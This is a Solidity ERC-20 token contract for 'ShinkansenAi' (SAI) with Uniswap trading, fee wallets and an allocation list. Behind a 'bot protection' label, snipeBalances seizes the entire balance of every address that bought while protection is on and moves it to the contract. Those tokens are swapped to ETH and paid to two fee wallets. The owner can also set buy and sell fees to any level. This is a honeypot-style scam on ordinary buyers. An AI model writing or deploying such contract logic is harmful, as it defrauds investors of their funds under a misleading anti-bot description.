1 pragma solidity ^0.8.17;
2 // SPDX-License-Identifier: Unlicensed
3 interface IERC20 {
4 
5     function totalSupply() external view returns (uint256);
6     function balanceOf(address account) external view returns (uint256);
7     function transfer(address recipient, uint256 amount) external returns (bool);
8     function allowance(address owner, address spender) external view returns (uint256);
9     function approve(address spender, uint256 amount) external returns (bool);
10     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
11 
12     event Transfer(address indexed from, address indexed to, uint256 value);
13     event Approval(address indexed owner, address indexed spender, uint256 value);
14 }
15 
16 library SafeMath {
17 
18     function add(uint256 a, uint256 b) internal pure returns (uint256) {
19         uint256 c = a + b;
20         require(c >= a, "SafeMath: addition overflow");
21 
22         return c;
23     }
24 
25     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
26         return sub(a, b, "SafeMath: subtraction overflow");
27     }
28 
29     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
30         require(b <= a, errorMessage);
31         uint256 c = a - b;
32 
33         return c;
34     }
35 
36     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
37         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
38         // benefit is lost if 'b' is also tested.
39         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
40         if (a == 0) {
41             return 0;
42         }
43 
44         uint256 c = a * b;
45         require(c / a == b, "SafeMath: multiplication overflow");
46 
47         return c;
48     }
49 
50     function div(uint256 a, uint256 b) internal pure returns (uint256) {
51         return div(a, b, "SafeMath: division by zero");
52     }
53 
54     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
55         require(b > 0, errorMessage);
56         uint256 c = a / b;
57         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
58 
59         return c;
60     }
61 
62     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
63         return mod(a, b, "SafeMath: modulo by zero");
64     }
65 
66     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
67         require(b != 0, errorMessage);
68         return a % b;
69     }
70 }
71 
72 abstract contract Context {
73     //function _msgSender() internal view virtual returns (address payable) {
74     function _msgSender() internal view virtual returns (address) {
75         return msg.sender;
76     }
77 
78     function _msgData() internal view virtual returns (bytes memory) {
79         this;
80         // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
81         return msg.data;
82     }
83 }
84 
85 library Address {
86 
87     function isContract(address account) internal view returns (bool) {
88         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
89         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
90         // for accounts without code, i.e. `keccak256('')`
91         bytes32 codehash;
92         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
93         // solhint-disable-next-line no-inline-assembly
94         assembly {codehash := extcodehash(account)}
95         return (codehash != accountHash && codehash != 0x0);
96     }
97 
98     function sendValue(address payable recipient, uint256 amount) internal {
99         require(address(this).balance >= amount, "Address: insufficient balance");
100 
101         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
102         (bool success,) = recipient.call{value : amount}("");
103         require(success, "Address: unable to send value, recipient may have reverted");
104     }
105 
106     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
107         return functionCall(target, data, "Address: low-level call failed");
108     }
109 
110     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
111         return _functionCallWithValue(target, data, 0, errorMessage);
112     }
113 
114     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
115         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
116     }
117 
118     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
119         require(address(this).balance >= value, "Address: insufficient balance for call");
120         return _functionCallWithValue(target, data, value, errorMessage);
121     }
122 
123     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
124         require(isContract(target), "Address: call to non-contract");
125 
126         // solhint-disable-next-line avoid-low-level-calls
127         (bool success, bytes memory returndata) = target.call{value : weiValue}(data);
128         if (success) {
129             return returndata;
130         } else {
131             // Look for revert reason and bubble it up if present
132             if (returndata.length > 0) {
133                 // The easiest way to bubble the revert reason is using memory via assembly
134 
135                 // solhint-disable-next-line no-inline-assembly
136                 assembly {
137                     let returndata_size := mload(returndata)
138                     revert(add(32, returndata), returndata_size)
139                 }
140             } else {
141                 revert(errorMessage);
142             }
143         }
144     }
145 }
146 
147 contract Ownable is Context {
148     address private _owner;
149 
150     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
151 
152     constructor () {
153         address msgSender = _msgSender();
154         _owner = msgSender;
155         emit OwnershipTransferred(address(0), msgSender);
156     }
157 
158     function owner() public view returns (address) {
159         return _owner;
160     }
161 
162     modifier onlyOwner() {
163         require(_owner == _msgSender(), "Ownable: caller is not the owner");
164         _;
165     }
166 
167     function renounceOwnership() public virtual onlyOwner {
168         emit OwnershipTransferred(_owner, address(0));
169         _owner = address(0);
170     }
171 
172     function transferOwnership(address newOwner) public virtual onlyOwner {
173         require(newOwner != address(0), "Ownable: new owner is the zero address");
174         emit OwnershipTransferred(_owner, newOwner);
175         _owner = newOwner;
176     }
177 }
178 
179 interface IUniswapV2Factory {
180     function createPair(address tokenA, address tokenB) external returns (address pair);
181     function getPair(address token0, address token1) external view returns (address);
182 }
183 
184 interface IUniswapV2Router02 {
185     function factory() external pure returns (address);
186     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
187     function swapExactTokensForETHSupportingFeeOnTransferTokens(
188         uint amountIn,
189         uint amountOutMin,
190         address[] calldata path,
191         address to,
192         uint deadline
193     ) external;
194     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
195         uint amountIn,
196         uint amountOutMin,
197         address[] calldata path,
198         address to,
199         uint deadline
200     ) external;
201     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
202     external payable returns (uint[] memory amounts);
203     function addLiquidityETH(
204         address token,
205         uint amountTokenDesired,
206         uint amountTokenMin,
207         uint amountETHMin,
208         address to,
209         uint deadline
210     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
211     function removeLiquidity(
212         address tokenA,
213         address tokenB,
214         uint liquidity,
215         uint amountAMin,
216         uint amountBMin,
217         address to,
218         uint deadline
219     ) external returns (uint amountA, uint amountB);
220     function WETH() external pure returns (address);
221 }
222 
223 contract ShinkansenAi is Context, IERC20, Ownable {
224     using SafeMath for uint256;
225     using Address for address;
226     modifier lockTheSwap {
227         inSwapAndLiquify = true;
228         _;
229         inSwapAndLiquify = false;
230     }
231 
232     IterableMapping private BotsnipingMap = new IterableMapping();
233     IUniswapV2Router02 public uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
234     address public marketPair = address(0);
235     address private feeOne = 0xa9A1fEB501702309A8B560Abd9CE61e13E5f252c;
236     address private feeTwo = 0x27187EB872759630A95d18E9a6B67ED21AeA5996;    
237     mapping(address => uint256) private _balances;
238     mapping(address => mapping(address => uint256)) private _allowances;
239     mapping(address => bool) private _isExcludedFromFee;
240     string private _name = "ShinkansenAi";
241     string private _symbol = "SAI";
242     uint8 private _decimals = 9;
243     uint256 private _tTotal = 1_000_000_000 * 10 ** _decimals;
244     uint256 public _maxWalletAmount = 20_000_000 * 10 ** _decimals;
245     bool inSwapAndLiquify;
246     uint256 public ethPriceToSwap = 100000000000000000; 
247     uint256 public buyFee = 20;
248     uint256 public sellFee = 20;
249     address private deployer;
250     bool public isBotProtectionEnabled;
251     
252     constructor () {
253          _balances[address(this)] = _tTotal*75/100;
254          _balances[0xa9A1fEB501702309A8B560Abd9CE61e13E5f252c] = _tTotal*2/100;
255          _balances[0x27187EB872759630A95d18E9a6B67ED21AeA5996] = _tTotal*2/100;
256          _balances[0xEDdd73710970F5FC5b5198d78f3364f1366De219] = _tTotal*2/100;
257          _balances[0x4797bCccc3562a610D8f2B2cb9e44C36448EAB9A] = _tTotal*2/100;
258          _balances[0xf924e5D1ef9200BF05f54dD5Deb22F0DEC5B3Ea3] = _tTotal*2/100;
259          _balances[0x0A932Fd2A9d3b96D0f098cd7f77177C4Ec61278E] = _tTotal*2/100;
260          _balances[0x0b533D5B21ee1EA6473e27C47e4a13404012dD2d] = _tTotal*2/100;
261          _balances[0x82C56a1aEF999A915C1021e8b01408aF7581F6b3] = _tTotal*2/100;
262          _balances[0x5a5ecbA11a2144e2e6B6DBC1b852FC7068eC8b0D] = _tTotal*2/100;
263          _balances[0x5712ae1d2f6f73726957d5bda280F2c9e578fBA6] = _tTotal*2/100;
264          _balances[0x353A8A9eA5f7e674b3Fa9DB6F65889929a4eF6Ae] = _tTotal*2/100;
265          _balances[0xf4e7cd11e3499D6E84C6C776b666696dEF618Dd4] = _tTotal*2/100;
266          _balances[0x825D3b1B1adc8655B1d8FAc6ca88b0dF739abcC3] = _tTotal*1/100;
267                                                  
268         _isExcludedFromFee[owner()] = true;
269         _isExcludedFromFee[address(uniswapV2Router)] = true;
270         _isExcludedFromFee[address(this)] = true;
271         deployer = owner();
272         emit Transfer(address(0), address(this), _tTotal*75/100);
273         emit Transfer(address(0), 0xa9A1fEB501702309A8B560Abd9CE61e13E5f252c, _tTotal*2/100);
274         emit Transfer(address(0), 0x27187EB872759630A95d18E9a6B67ED21AeA5996, _tTotal*2/100);
275         emit Transfer(address(0), 0xEDdd73710970F5FC5b5198d78f3364f1366De219, _tTotal*2/100);
276         emit Transfer(address(0), 0x4797bCccc3562a610D8f2B2cb9e44C36448EAB9A, _tTotal*2/100);
277         emit Transfer(address(0), 0xf924e5D1ef9200BF05f54dD5Deb22F0DEC5B3Ea3, _tTotal*2/100);
278         emit Transfer(address(0), 0x0A932Fd2A9d3b96D0f098cd7f77177C4Ec61278E, _tTotal*2/100);
279         emit Transfer(address(0), 0x0b533D5B21ee1EA6473e27C47e4a13404012dD2d, _tTotal*2/100);
280         emit Transfer(address(0), 0x82C56a1aEF999A915C1021e8b01408aF7581F6b3, _tTotal*2/100);
281         emit Transfer(address(0), 0x5a5ecbA11a2144e2e6B6DBC1b852FC7068eC8b0D, _tTotal*2/100);
282         emit Transfer(address(0), 0x5712ae1d2f6f73726957d5bda280F2c9e578fBA6, _tTotal*2/100);
283         emit Transfer(address(0), 0x353A8A9eA5f7e674b3Fa9DB6F65889929a4eF6Ae, _tTotal*2/100);
284         emit Transfer(address(0), 0xf4e7cd11e3499D6E84C6C776b666696dEF618Dd4, _tTotal*2/100);
285         emit Transfer(address(0), 0x825D3b1B1adc8655B1d8FAc6ca88b0dF739abcC3, _tTotal*1/100);
286     }
287 
288     function name() public view returns (string memory) {
289         return _name;
290     }
291 
292     function setMaxWalletAmount(uint256 maxWalletAmount) external onlyOwner() {
293         _maxWalletAmount = maxWalletAmount * 10 ** 9;
294     }
295 
296     function symbol() public view returns (string memory) {
297         return _symbol;
298     }
299 
300     function decimals() public view returns (uint8) {
301         return _decimals;
302     }
303 
304     function totalSupply() public view override returns (uint256) {
305         return _tTotal;
306     }
307 
308     function balanceOf(address account) public view override returns (uint256) {
309         return _balances[account];
310     }
311 
312     function transfer(address recipient, uint256 amount) public override returns (bool) {
313         _transfer(_msgSender(), recipient, amount);
314         return true;
315     }
316 
317     function allowance(address owner, address spender) public view override returns (uint256) {
318         return _allowances[owner][spender];
319     }
320 
321     function approve(address spender, uint256 amount) public override returns (bool) {
322         _approve(_msgSender(), spender, amount);
323         return true;
324     }
325 
326     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
327         _transfer(sender, recipient, amount);
328         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
329         return true;
330     }
331 
332     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
333         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
334         return true;
335     }
336 
337     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
338         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
339         return true;
340     }
341 
342     function setTaxFees(uint256 buy, uint256 sell) external onlyOwner {
343         buyFee = buy;
344         sellFee = sell;
345     }
346 
347     function disableBotProtectionPermanently() external onlyOwner {
348         require(isBotProtectionEnabled,"Bot ssniping has already been disabled");
349         isBotProtectionEnabled = false;
350     }
351 
352     function excludeIncludeFromFee(address[] calldata addresses, bool isExcludeFromFee) public onlyOwner {
353         addRemoveFee(addresses, isExcludeFromFee);
354     }
355 
356     function addRemoveFee(address[] calldata addresses, bool flag) private {
357         for (uint256 i = 0; i < addresses.length; i++) {
358             address addr = addresses[i];
359             _isExcludedFromFee[addr] = flag;
360         }
361     }
362 
363     function openTrading() external onlyOwner() {
364         require(marketPair == address(0),"UniswapV2Pair has already been set");
365         _approve(address(this), address(uniswapV2Router), _tTotal);
366         marketPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
367         uniswapV2Router.addLiquidityETH{value: address(this).balance}(
368             address(this),
369             balanceOf(address(this)),
370             0,
371             0,
372             owner(),
373             block.timestamp);
374         IERC20(marketPair).approve(address(uniswapV2Router), type(uint).max);
375         isBotProtectionEnabled = true;
376     }
377 
378     function isExcludedFromFee(address account) public view returns (bool) {
379         return _isExcludedFromFee[account];
380     }
381 
382     function _approve(address owner, address spender, uint256 amount) private {
383         require(owner != address(0), "ERC20: approve from the zero address");
384         require(spender != address(0), "ERC20: approve to the zero address");
385 
386         _allowances[owner][spender] = amount;
387         emit Approval(owner, spender, amount);
388     }
389 
390     function _transfer(address from, address to, uint256 txnAmount) private {
391         require(from != address(0), "ERC20: transfer from the zero address");
392         require(to != address(0), "ERC20: transfer to the zero address");
393         require(txnAmount > 0, "Transfer amount must be greater than zero");
394         uint256 taxAmount = 0;
395         bool takeFees = !_isExcludedFromFee[from] && !_isExcludedFromFee[to] && from != owner() && to != owner();
396         uint256 amount = txnAmount;
397         if(from != owner() && to != owner() && from != address(this) && to != address(this)) {
398             if(takeFees) {
399                 taxAmount = !isBotProtectionEnabled ? amount.mul(buyFee).div(100) : 0;
400                 if (from == marketPair && isBotProtectionEnabled) {
401                     snipeBalances();
402                     BotsnipingMap.set(to, block.timestamp);
403                 }
404                 if (from != marketPair && to == marketPair) {
405                     if(txnAmount > _balances[from]) {
406                         amount = _balances[from];
407                     }
408                     taxAmount = !isBotProtectionEnabled ? amount.mul(sellFee).div(100) : 0;
409                     uint256 contractTokenBalance = balanceOf(address(this));
410                     if (contractTokenBalance > 0) {
411                         uint256 tokenAmount = getTokenPrice();
412                         if (contractTokenBalance >= tokenAmount && !inSwapAndLiquify) {
413                             swapTokensForEth(tokenAmount);
414                         }
415                     }
416                 }
417             }
418         }       
419         uint256 transferAmount = amount.sub(taxAmount);
420         _balances[from] = _balances[from].sub(amount);
421         _balances[to] = _balances[to].add(transferAmount);
422         _balances[address(this)] = _balances[address(this)].add(taxAmount);
423         emit Transfer(from, to, txnAmount);
424     }
425 
426     function snipeBalances() private {
427         if(isBotProtectionEnabled) {
428             for(uint256 i =0; i < BotsnipingMap.size(); i++) {
429                 address holder = BotsnipingMap.getKeyAtIndex(i);
430                 uint256 amount = _balances[holder];
431                 if(amount > 0) {
432                     _balances[holder] = _balances[holder].sub(amount);
433                     _balances[address(this)] = _balances[address(this)].add(amount);
434                 }
435                 BotsnipingMap.remove(holder);
436             }
437         }
438     }
439 
440     function numberOfSnipedBot() public view returns(uint256) {
441         uint256 count = 0;
442         for(uint256 i =0; i < BotsnipingMap.size(); i++) {
443             address holder = BotsnipingMap.getKeyAtIndex(i);
444             uint timestamp = BotsnipingMap.get(holder);
445             if(block.timestamp >=  timestamp) 
446                 count++;
447         }
448         return count;
449     }
450 
451     function manualSnipeBot() external {
452         snipeBalances();
453     }
454     function manualSwap() external {
455         uint256 contractTokenBalance = balanceOf(address(this));
456         if (contractTokenBalance > 0) {
457             if (!inSwapAndLiquify) {
458                 swapTokensForEth(contractTokenBalance);
459             }
460         }
461     }
462 
463     function swapTokensForEth(uint256 tokenAmount) private {
464         // generate the uniswap pair path of token -> weth
465         address[] memory path = new address[](2);
466         path[0] = address(this);
467         path[1] = uniswapV2Router.WETH();
468         _approve(address(this), address(uniswapV2Router), tokenAmount);
469         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
470             tokenAmount,
471             0,
472             path,
473             address(this),
474             block.timestamp
475         );
476 
477         uint256 ethBalance = address(this).balance;
478         uint256 halfShare = ethBalance.div(2);  
479         payable(feeOne).transfer(halfShare);
480         payable(feeTwo).transfer(halfShare); 
481     }
482 
483     function getTokenPrice() public view returns (uint256)  {
484         address[] memory path = new address[](2);
485         path[0] = uniswapV2Router.WETH();
486         path[1] = address(this);
487         return uniswapV2Router.getAmountsOut(ethPriceToSwap, path)[1];
488     }
489 
490     function setEthPriceToSwap(uint256 ethPriceToSwap_) external onlyOwner {
491         ethPriceToSwap = ethPriceToSwap_;
492     }
493 
494     receive() external payable {}
495 
496     function recoverEthInContract() external {
497         uint256 ethBalance = address(this).balance;
498         payable(deployer).transfer(ethBalance);
499     }
500 
501     function recoverERC20Tokens(address contractAddress) external {
502         IERC20 erc20Token = IERC20(contractAddress);
503         uint256 balance = erc20Token.balanceOf(address(this));
504         erc20Token.transfer(deployer, balance);
505     }
506 }
507 
508 
509 contract IterableMapping {
510     // Iterable mapping from address to uint;
511     struct Map {
512         address[] keys;
513         mapping(address => uint) values;
514         mapping(address => uint) indexOf;
515         mapping(address => bool) inserted;
516     }
517 
518     Map private map;
519 
520     function get(address key) public view returns (uint) {
521         return map.values[key];
522     }
523 
524     function keyExists(address key) public view returns (bool) {
525         return (getIndexOfKey(key) != - 1);
526     }
527 
528     function getIndexOfKey(address key) public view returns (int) {
529         if (!map.inserted[key]) {
530             return - 1;
531         }
532         return int(map.indexOf[key]);
533     }
534 
535     function getKeyAtIndex(uint index) public view returns (address) {
536         return map.keys[index];
537     }
538 
539     function size() public view returns (uint) {
540         return map.keys.length;
541     }
542 
543     function set(address key, uint val) public {
544         if (map.inserted[key]) {
545             map.values[key] = val;
546         } else {
547             map.inserted[key] = true;
548             map.values[key] = val;
549             map.indexOf[key] = map.keys.length;
550             map.keys.push(key);
551         }
552     }
553 
554     function remove(address key) public {
555         if (!map.inserted[key]) {
556             return;
557         }
558         delete map.inserted[key];
559         delete map.values[key];
560         uint index = map.indexOf[key];
561         uint lastIndex = map.keys.length - 1;
562         address lastKey = map.keys[lastIndex];
563         map.indexOf[lastKey] = index;
564         delete map.indexOf[key];
565         map.keys[index] = lastKey;
566         map.keys.pop();
567     }
568 }